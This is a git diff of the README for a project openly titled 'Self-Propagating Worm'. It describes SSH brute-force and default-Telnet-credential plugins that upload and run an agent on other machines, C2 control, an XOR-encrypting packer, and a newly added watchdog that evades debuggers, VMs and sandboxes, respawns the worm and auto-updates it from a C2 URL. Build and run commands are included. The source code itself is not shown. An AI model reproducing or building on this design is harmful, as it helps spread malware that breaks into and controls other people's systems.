@@ -1,6 +1,6 @@
 # Self-Propagating Worm
 
-> Collection of scripts **and** a binary agent for automated reconnaissance scanning, SSH/Telnet propagation, and C2 control.
+> Collection of scripts and a binary agent for automated reconnaissance scanning, SSH/Telnet propagation, and C2 control.
 
 ---
 
@@ -47,7 +47,7 @@ The script will automatically:
 
 ---
 
-## Recon Module — `recon.py`
+## Recon Module — recon.py
 
 | Function                               | Purpose                                                                                                                     |
 | -------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
@@ -62,11 +62,11 @@ The script will automatically:
 
 ---
 
-## Plugins — `guid/*.py`
+## Plugins — guid/*.py
 
 All plugins share a **Technique interface**:
 
-```python
+```
 def applicable(host) -> bool
 def execute(host, creds_db) -> bool
 ```
@@ -76,7 +76,7 @@ def execute(host, creds_db) -> bool
 | **`SSHBruteForce`**  | Targets port **22** → tries user/pass combos **&** SSH keys; on success, uploads & runs the payload/agent via SFTP |
 | **`TelnetDefaults`** | Targets port **23** → attempts default Telnet creds; on success, transfers the agent in Base64 and executes        |
 
-All are aggregated into **`ALL_TECHNIQUES`** for use by `recon.py`.
+All are aggregated into **`ALL_TECHNIQUES`** for use by recon.py.
 
 ---
 
@@ -123,7 +123,7 @@ When run the packed EXE, it automatically decrypts the payload and executes it i
 - **Pack any binary** into a self extracting EXE.  
 - **XOR encryption** of the payload at pack time and automatic decryption at run time.  
 - **Built in VM** for a simple stack based bytecode:
-  - `PUSH`, `ADD`, `SUB`, `MUL`, `DIV`, `PRINT`, `HALT`  
+  - PUSH, ADD, SUB, MUL, DIV, PRINT, HALT  
 - **No external dependencies** all code is contained in the EXE.
 
 ## Build on Windows / MinGW
@@ -178,7 +178,88 @@ packed_vm.exe
 
 ## Customization
 
-* **Encryption key**: edit the `key` array in `packer_loader.c`.
-* **VM opcodes / stack size**: modify `vm.h`/`vm.c`.
-* **Add new instructions**: extend the enum in `vm.h` and handling in `run_vm`.
+* **Encryption key**: edit the key array in packer_loader.c.
+* **VM opcodes / stack size**: modify vm.h/vm.c.
+* **Add new instructions**: extend the enum in vm.h and handling in run_vm.
+
+# Watchdog & P2P Loader Module
+
+This component provides:
+
+1. **Self-defense** — detects debuggers, virtual machines, and sandbox environments.
+2. **Watchdog daemon**:
+
+   * Daemonizes the process (double-fork).
+   * Monitors the worm process and respawns it if it dies.
+   * Verifies the binarys SHA-256 hash every 30 seconds; if changed or missing, downloads the latest version from a URL and restarts it.
+3. **P2P loader**:
+
+   * Runs in a background thread and every 30 seconds loads c2_config.dll.
+   * Reads exported C2Count and C2Addresses symbols.
+   * Makes the C2 addresses available for your P2P logic.
+
+---
+
+### Features
+
+* **Anti-analysis**
+  is_compromised returns true if a debugger is present, a hypervisor bit is set, or DMI strings indicate a sandbox environment.
+
+* **Watchdog**
+
+  * Daemonizes the process.
+  * Spawns and monitors the worm binary.
+  * Every 30 seconds checks process health and file integrity.
+  * Auto-updates via HTTP/S using libcurl and OpenSSL.
+
+* **P2P loader**
+
+  * Runs in a separate thread.
+  * Every 30 seconds reloads c2_config.dll.
+  * Reads the exported C2 addresses for decentralized backup channels.
+
+---
+
+### Build & Usage
+
+#### Prerequisites
+
+* **MinGW-w64** toolchain (x86_64-w64-mingw32-gcc)
+* Development libraries for **libcurl** and **OpenSSL**
+
+#### Building
+
+```sh
+make
+```
+
+This produces:
+
+* c2_config.dll
+* watchdog.exe
+
+#### Running
+
+```
+watchdog.exe <agent.exe> <https://c2.server/agent.exe>
+```
+
+* Exits immediately if a debugger, VM, or sandbox environment is detected.
+* Otherwise:
+
+  * Starts the agent, monitors it, and updates it as needed.
+  * Concurrently reloads P2P C2 addresses from the DLL every 30 seconds.
+
+---
+
+### Updating the C2 List
+
+1. Edit `dll/c2_config.c`, adjust C2Count and the C2Addresses array.
+2. Rebuild just the DLL:
+
+   ```
+   make c2_config.dll
+   ```
+3. The running service will pick up the new addresses on its next DLL reload cycle.
+
 
